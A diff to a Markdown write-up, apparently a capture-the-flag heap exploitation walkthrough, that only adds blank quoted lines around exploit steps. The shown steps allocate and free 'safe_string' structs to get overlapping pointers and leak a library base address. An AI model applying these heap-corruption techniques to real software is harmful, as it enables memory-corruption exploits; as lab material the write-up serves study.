@@ -67,9 +67,11 @@ memory region has the permission to read and write.
 
 ## Overlapping pointers of struct 0 && string of struct 2 
 >  new.create_safe_string(0, 100, b"")
+>
 >  new.create_safe_string(1, 100, b"")
 >
 >  new.free_safe_string(0)
+>
 >  new.free_safe_string(1)
 >
 >  new.create_safe_string(2, 16, b"")
@@ -94,11 +96,15 @@ to leak to library pointers to stack
 
 ## Leaking Library base
 >   new.create_safe_string(3, 2000, b"")
+>
 >   new.create_safe_string(4, 2000, b"")
-
+>
 >   new.free_safe_string(3)
+>
 >   new.free_safe_string(4)
+>
 >   new.create_safe_string(5, 2000, b"")
+>
 >   library_base = get_library_offset(new.read_safe_string(5))
 
 
